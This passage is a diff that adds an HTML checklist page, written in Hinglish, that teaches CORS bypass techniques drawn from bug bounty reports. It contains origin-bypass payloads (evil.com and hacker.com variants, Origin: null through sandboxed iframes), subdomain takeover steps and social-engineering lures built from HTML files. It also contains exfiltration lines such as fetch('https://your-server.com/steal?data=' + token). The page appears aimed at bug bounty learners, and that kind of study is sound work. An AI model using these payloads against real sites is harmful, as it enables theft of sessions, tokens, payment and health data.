+                            class="item-text"><strong>With-dash variant try karo</strong> — <code
+                                class="c">https://anything-target.com</code> (dash ke saath).</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Subdomain style try karo</strong> — <code
+                                class="c">https://target.com.hacker.com</code> (subdomain ban jaye).</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- REPORT #06 — Localhost/Dev -->
+        <div class="report-card" data-severity="medium" id="report-06">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #06 · Total #275</div>
+                    <div class="report-title">Localhost/Dev Environment Whitelist Bypass</div>
+                    <div class="report-target">🎯 ██████.net (Cloud Provider) · @vortex · $750 · Config Token Leak</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Localhost Trust</span><span
+                            class="technique-tag">Dev Leftover</span><span class="technique-tag">Hostname Trick</span>
+                    </div>
+                </div><span class="severity-badge sev-medium">🟡 MEDIUM</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Developer ne testing ke liye <code class="c">localhost</code> whitelist
+                        kiya aur production mein hatana bhool gaya. Regex: <code class="c">.*\.localhost</code>. Hacker
+                        ne <code class="c">Origin: http://target.net.localhost</code> bheja → Server ne allow kiya →
+                        Internal cloud config tokens leak.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>"Internal" origins try karo</strong> — <code
+                                class="c">http://localhost</code>, <code class="c">http://127.0.0.1</code>, <code
+                                class="c">http://0.0.0.0</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Localhost subdomains try karo</strong> — <code
+                                class="c">http://target.com.localhost</code>, <code
+                                class="c">http://127.0.0.1.target.com</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Dev environments try karo</strong> — <code
+                                class="c">http://dev.target.com.local</code>, <code
+                                class="c">http://staging.target.com</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Port variations try karo</strong> — <code
+                                class="c">http://localhost:3000</code>, <code class="c">http://localhost:8080</code>
+                            with different ports.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- REPORT #13 — Wildcard Middle -->
+        <div class="report-card" data-severity="high" id="report-13">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #13 · Total #282</div>
+                    <div class="report-title">Wildcard in the Middle (target.*.com) Regex Bypass</div>
+                    <div class="report-target">🎯 ██████ (E-commerce) · HackerOne Dork · $1,500 · Cart + Address Leak
+                    </div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Middle Match</span><span
+                            class="technique-tag">Regex Anchor</span><span class="technique-tag">Partner Bypass</span>
+                    </div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Regex: <code class="c">target\.com</code> (kahin bhi match). <code
+                            class="c">Origin: https://target.hacker.com</code> bheja → "target" word beech mein mil gaya
+                        → Server ne "Trusted Partner" samajh ke Cart Details + Saved Address de diya.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Middle-match test karo</strong> — <code
+                                class="c">https://target.hacker.com</code> (target word beech mein).</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Path-based test karo</strong> — <code
+                                class="c">https://hacker.com/target.com</code> (path mein target).</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Dot confusion test karo</strong> — <code
+                                class="c">https://targetXcom.hacker.com</code> (dot replaced with character).</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- REPORT #14 — Underscore -->
+        <div class="report-card" data-severity="high" id="report-14">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #14 · Total #283</div>
+                    <div class="report-title">Underscore (_) Subdomain Bypass — Browser vs Server Conflict</div>
+                    <div class="report-target">🎯 ██████ (Social Network) · HackerOne Dork · $2,000 · User Data Leak
+                    </div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Underscore Trick</span><span
+                            class="technique-tag">Parser Conflict</span><span class="technique-tag">Prefix Match</span>
+                    </div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Server regex: <code class="c">^https?://.*target\.com</code> (prefix
+                        check). <code class="c">Origin: https://target.com_.hacker.com</code> bheja → Server ne dekha
+                        "target.com se start ho rahi hai" → Allow kiya. Par browser ke liye asli domain <code
+                            class="c">hacker.com</code> tha.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Special characters try karo</strong> — <code
+                                class="c">target.com_.hacker.com</code>, <code
+                                class="c">target.com%0d.hacker.com</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Prefix match test karo</strong> — <code
+                                class="c">target.com@hacker.com</code>, <code
+                                class="c">target.com#hacker.com</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Browser-specific test karo</strong> — Same payload alag-alag
+                            browsers (Chrome, Firefox, Safari) mein test karo.</span>
+                    </li>
+                </ul>
+                <div class="protip-box">
+                    <div class="protip-label">💡 REGEX BYPASS CHEATSHEET</div>
+                    <div class="protip-text"><code class="c">target.com.evil.com</code> · <code
+                            class="c">evil-target.com</code> · <code class="c">target.com_.evil.com</code> · <code
+                            class="c">target.com@evil.com</code> · <code class="c">target.com%60evil.com</code> · <code
+                            class="c">targetcom.evil.com</code></div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ PHASE 3 — NULL ORIGIN ATTACKS ═══ -->
+<section class="phase-section" id="phase3">
+    <div class="phase-header"><span class="phase-number">PHASE 03</span><span class="phase-title">NULL ORIGIN
+            EXPLOITATION</span><span class="phase-count" id="p3count">0 / 2 reports</span></div>
+    <div class="cards-grid" id="grid-phase3">
+
+        <!-- REPORT #07 — GitLab -->
+        <div class="report-card" data-severity="high" id="report-07">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #07 · Total #276</div>
+                    <div class="report-title">GitLab Null Origin Exploitation — Sandboxed Iframe</div>
+                    <div class="report-target">🎯 GitLab · @pwn_lab · $2,000 · Private API Tokens + Emails</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Null Origin</span><span
+                            class="technique-tag">Sandbox Iframe</span><span class="technique-tag">Token Theft</span>
+                    </div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">GitLab ne <code class="c">Origin: null</code> ko allow kiya (local files
+                        + sandboxed envs ke liye). Hacker ne <code
+                            class="c">&lt;iframe sandbox="allow-scripts"&gt;</code> se request bheji → Browser ne auto
+                        <code class="c">Origin: null</code> bheja → GitLab ne Private API Tokens + Emails de diye.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Null origin test karo</strong> — Burp mein <code
+                                class="c">Origin: null</code> bhejo aur response mein <code
+                                class="c">Access-Control-Allow-Origin: null</code> check karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Sandboxed iframe POC banao</strong> — <code
+                                class="c">&lt;iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,..."&gt;</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Data URI trick karo</strong> — <code
+                                class="c">src="data:text/html,&lt;script&gt;fetch(...)&lt;/script&gt;"</code> se null
+                            origin trigger karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Local file trick karo</strong> — Victim ko <code
+                                class="c">.html</code> file download karwao → Open karne par <code
+                                class="c">Origin: null</code> bhejta hai.</span>
+                    </li>
+                </ul>
+                <div class="mindset-box">
+                    <div class="mindset-label">🧠 KEY TAKEAWAY</div>
+                    <div class="mindset-text">"null is not Empty." null origin ka matlab hai ki request ek "Non-web"
+                        source (Local file, Sandbox iframe, Data URI) se aa rahi hai. Allow-Origin: null hamesha avoid
+                        karo.</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- REPORT #08 — Null via Local File -->
+        <div class="report-card" data-severity="high" id="report-08">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #08 · Total #277</div>
+                    <div class="report-title">Private Token Leak via Null Origin — Local File Trap</div>
+                    <div class="report-target">🎯 ██████.in (E-commerce) · @bug_stalker · $1,200 · Checkout Token +
+                        Session</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Local File</span><span
+                            class="technique-tag">Social Engineering</span><span class="technique-tag">Checkout
+                            Theft</span></div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text"><code class="c">/api/v1/cart/checkout_token</code> par <code
+                            class="c">Origin: null</code> allowed. Hacker ne "50% Discount Coupon" HTML file banayi →
+                        Victim ne download karke kholi → Browser <code class="c">Origin: null</code> bhejta hai →
+                        Checkout token + session_id = Victim ke saved cards se shopping.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Financial endpoints test karo</strong> — <code
+                                class="c">/checkout</code>, <code class="c">/cart</code>, <code
+                                class="c">/payment</code> par null origin try karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Attractive file banao</strong> — "Discount coupon", "Invoice",
+                            "Receipt" HTML file jo victim download kare.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Exfiltration endpoint setup karo</strong> — <code
+                                class="c">fetch('https://your-server.com/steal?data=' + token)</code></span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- ═══ PHASE 4 — ADVANCED CHAIN ATTACKS ═══ -->
+<section class="phase-section" id="phase4">
+    <div class="phase-header"><span class="phase-number">PHASE 04</span><span class="phase-title">ADVANCED CHAIN ATTACKS
+            — SUBDOMAIN + XSS + REDIRECT</span><span class="phase-count" id="p4count">0 / 4 reports</span></div>
+    <div class="cards-grid" id="grid-phase4">
+
+        <!-- REPORT #09 — Subdomain Takeover -->
+        <div class="report-card" data-severity="critical" id="report-09">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #09 · Total #278</div>
+                    <div class="report-title">Subdomain Takeover → CORS Whitelist Bypass (Fortune 500)</div>
+                    <div class="report-target">🎯 ██████.com (Fortune 500) · @corben_leo · $3,000-$5,000 · Full Account
+                        Takeover</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Subdomain Takeover</span><span
+                            class="technique-tag">S3 Bucket</span><span class="technique-tag">Trusted Enemy</span></div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Main site sirf <code class="c">*.target.com</code> subdomains allow karti
+                        thi. Hacker ne <code class="c">dev-test.target.com</code> dhoondha jo S3 bucket se linked tha
+                        par 404 de raha tha → S3 bucket claim kiya → Malicious JS host ki → Ab hacker ka code "Trusted
+                        Subdomain" se run ho raha tha → Full session theft.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Subdomain enumeration karo</strong> — <code
+                                class="c">subfinder</code>, <code class="c">amass</code>, <code
+                                class="c">assetfinder</code> se saare subdomains nikaalo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Dangling DNS check karo</strong> — <code class="c">subjack</code>,
+                            <code class="c">nuclei -t takeovers/</code> se takeover-possible subdomains dhoondho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>CORS whitelist verify karo</strong> — Taken-over subdomain ko
+                            <code class="c">Origin</code> mein dalkar API response check karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Malicious JS host karo</strong> — Claim kiye hue subdomain par
+                            data-theft script deploy karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>POC demonstrate karo</strong> — Victim link kholta hai → Trusted
+                            subdomain se request → Session keys/Profile leak.</span>
+                    </li>
+                </ul>
+                <div class="chain-box">
+                    <div class="chain-label">⛓️ CHAIN FORMULA</div>
+                    <div class="chain-formula">Subdomain Enum → Find Dangling DNS → Takeover S3/Azure → Host Malicious
+                        JS → Whitelisted Origin → Steal Session → Account Takeover</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- REPORT #10 — XSS + CORS -->
+        <div class="report-card" data-severity="high" id="report-10">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #10 · Total #279</div>
+                    <div class="report-title">XSS on Trusted Subdomain → CORS Data Theft (Retailer)</div>
+                    <div class="report-target">🎯 ██████.com (E-commerce) · @security_pioneer · $1,500-$2,500 · Credit
+                        Card + Orders</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">XSS Chain</span><span
+                            class="technique-tag">Subdomain Trust</span><span class="technique-tag">Weakest Link</span>
+                    </div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Main site bahut secure. Par <code class="c">help.target.com</code> par
+                        Reflected XSS mila (normally Low severity). API <code class="c">help.target.com</code> ko trust
+                        karti thi → XSS payload se <code class="c">api.target.com</code> call ki → Credit Card info +
+                        Order History churaya. Low XSS → Critical CORS chain!</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Whitelisted subdomains par XSS dhoondho</strong> — <code
+                                class="c">help.</code>, <code class="c">blog.</code>, <code class="c">support.</code>,
+                            <code class="c">status.</code> — purane subdomains mein XSS hota hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>XSS se cross-origin request karo</strong> — XSS payload mein <code
+                                class="c">fetch(api_url, {credentials: 'include'})</code> dalo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Data exfiltration add karo</strong> — Fetched data ko <code
+                                class="c">navigator.sendBeacon()</code> ya <code class="c">new Image().src</code> se
+                            nikalo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Impact escalate karo</strong> — "Low XSS" ko "Critical CORS Chain"
+                            banao — bounty 10x ho jayegi.</span>
+                    </li>
+                </ul>
+                <div class="mindset-box">
+                    <div class="mindset-label">🧠 KEY TAKEAWAY</div>
+                    <div class="mindset-text">"Agar main gate (Main Domain) band hai, toh khidki (Subdomain) dhoondho."
+                        Hamesha do vulnerabilities ko milane ki koshish karo (XSS + CORS) taaki impact Critical ho jaye.
+                    </div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- REPORT #15 — PostMessage -->
+        <div class="report-card" data-severity="critical" id="report-15">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #15 · Total #284</div>
+                    <div class="report-title">CORS + PostMessage Chain — Silent Financial Data Theft</div>
+                    <div class="report-target">🎯 ██████ (Financial Dashboard) · HackerOne Dork · $3,500 · Financial
+                        Statements</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">PostMessage</span><span
+                            class="technique-tag">Iframe Chain</span><span class="technique-tag">Any Origin (*)</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">CORS tight tha, direct bypass nahi ho raha tha. Par app <code
+                            class="c">window.postMessage</code> use karti thi data transfer ke liye aur target origin
+                        <code class="c">*</code> (Any) tha. Hacker ne dashboard ko iframe mein load kiya → Dashboard ne
+                        data <code class="c">postMessage(*)</code> se bheja → Hacker ne listener laga ke Financial
+                        Statements chura liye.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>postMessage usage detect karo</strong> — Chrome DevTools > Sources
+                            tab mein <code class="c">postMessage</code> search karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Target origin check karo</strong> — <code
+                                class="c">postMessage(data, '*')</code> hai? = Bug! <code class="c">'*'</code> matlab
+                            koi bhi window receive kar sakta hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Listener POC banao</strong> — <code
+                                class="c">window.addEventListener('message', (e) => exfil(e.data))</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Iframe framing check karo</strong> — Kya target page iframe mein
+                            load ho raha hai? <code class="c">X-Frame-Options</code> missing = Chain possible.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- REPORT #17 — Open Redirect -->
+        <div class="report-card" data-severity="critical" id="report-17">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #17 · Total #286</div>
+                    <div class="report-title">Open Redirect → CORS Whitelist Bypass (Travel Site)</div>
+                    <div class="report-target">🎯 ██████ (Travel & Booking) · HackerOne Dork · $5,000 · Booking + Credit
+                        Card</div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Open Redirect</span><span
+                            class="technique-tag">Trusted Bridge</span><span class="technique-tag">Origin Persist</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">CORS sirf <code class="c">cars.target.com</code> aur <code
+                            class="c">hotels.target.com</code> allow karta tha. Hacker ne <code
+                            class="c">cars.target.com/redirect?url=evil.com</code> par Open Redirect dhoondha → Kuch
+                        browsers/APIs mein redirect ke baad purana "trusted" origin persist karta hai → Booking History
+                        + CC last 4 digits chori.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Whitelisted subdomains enumerate karo</strong> — CORS response se
+                            pata karo kaunse subdomains allowed hain.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Har subdomain par Open Redirect dhoondho</strong> — <code
+                                class="c">/redirect?url=</code>, <code class="c">/goto?</code>, <code
+                                class="c">/link?</code>, <code class="c">/out?</code> parameters check karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Redirect + fetch chain banao</strong> — Redirect ke through
+                            trusted origin maintain karke API call karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Mobile APIs bhi test karo</strong> — Mobile app APIs mein
+                            redirect-based origin persistence zyada common hai.</span>
+                    </li>
+                </ul>
+                <div class="chain-box">
+                    <div class="chain-label">⛓️ CHAIN FORMULA</div>
+                    <div class="chain-formula">Find Whitelisted Subdomain → Discover Open Redirect → Chain with CORS
+                        Request → Trusted Origin Persists → Steal Sensitive Data</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- ═══ PHASE 5 — INFRASTRUCTURE & CACHE ATTACKS ═══ -->
+<section class="phase-section" id="phase5">
+    <div class="phase-header"><span class="phase-number">PHASE 05</span><span class="phase-title">INFRASTRUCTURE &
+            CACHE-BASED CORS ATTACKS</span><span class="phase-count" id="p5count">0 / 4 reports</span></div>
+    <div class="cards-grid" id="grid-phase5">
+
+        <!-- REPORT #16 — Cache Poisoning -->
+        <div class="report-card" data-severity="critical" id="report-16">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #16 · Total #285</div>
+                    <div class="report-title">Web Cache Poisoning → CORS Bypass (Social Media)</div>
+                    <div class="report-target">🎯 ██████ (Social Media) · HackerOne Dork · $3,000 · Mass Data Theft
+                    </div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Cache Poisoning</span><span
+                            class="technique-tag">X-Cache</span><span class="technique-tag">Permanent Exploit</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Hacker ne <code class="c">Origin: https://attacker.com</code> + cache
+                        buster <code class="c">?cb=123</code> bheja → Server ne reflect kiya aur response cache kar liya
+                        (<code class="c">X-Cache: HIT</code>). Ab har normal user ko bhi wahi "poisoned" response milta
+                        tha jisme attacker.com allowed tha → Mass scale theft, bina victim ke kuch kiye.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Cache headers check karo</strong> — Response mein <code
+                                class="c">X-Cache</code>, <code class="c">CF-Cache-Status</code>, <code
+                                class="c">Age</code>, <code class="c">Vary</code> headers dhoondho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Vary header check karo</strong> — Agar <code
+                                class="c">Vary: Origin</code> missing hai, toh cache poisoning possible hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Poisoning attempt karo</strong> — Evil origin + cache buster se
+                            request bhejo, phir different browser se same URL kholo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Cache duration note karo</strong> — <code
+                                class="c">Cache-Control: max-age</code> dekho. Jitna lamba cache, utna zyada
+                            impact.</span>
+                    </li>
+                </ul>
+                <div class="mindset-box">
+                    <div class="mindset-label">🧠 KEY TAKEAWAY</div>
+                    <div class="mindset-text">"Ek baar poison dala, hazaaron users affect hue." Cache poisoning se CORS
+                        bypass permanent ban jata hai — bina victim ke kuch kiye data leak hota hai. Ye Mass
+                        Exploitation hai."</div>
+                </div>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- REPORT #18 — Swagger -->
+        <div class="report-card" data-severity="medium" id="report-18">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #18 · Total #287</div>
+                    <div class="report-title">Swagger UI Misconfiguration — Wildcard CORS Leak</div>
+                    <div class="report-target">🎯 ██████ (Healthcare SaaS) · HackerOne Dork · $800 · Patient Records
+                    </div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Swagger UI</span><span
+                            class="technique-tag">Wildcard *</span><span class="technique-tag">API Docs</span></div>
+                </div><span class="severity-badge sev-medium">🟡 MEDIUM</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Swagger UI (<code class="c">/swagger-ui.html</code>) mein "Try it out"
+                        feature tha. Developer ne Swagger ko "Easy to Use" banane ke liye <code
+                            class="c">Access-Control-Allow-Origin: *</code> + <code class="c">Credentials: true</code>
+                        set kiya → Swagger ke through patient_records API accessible → Health data leak.</div>
+                </div>
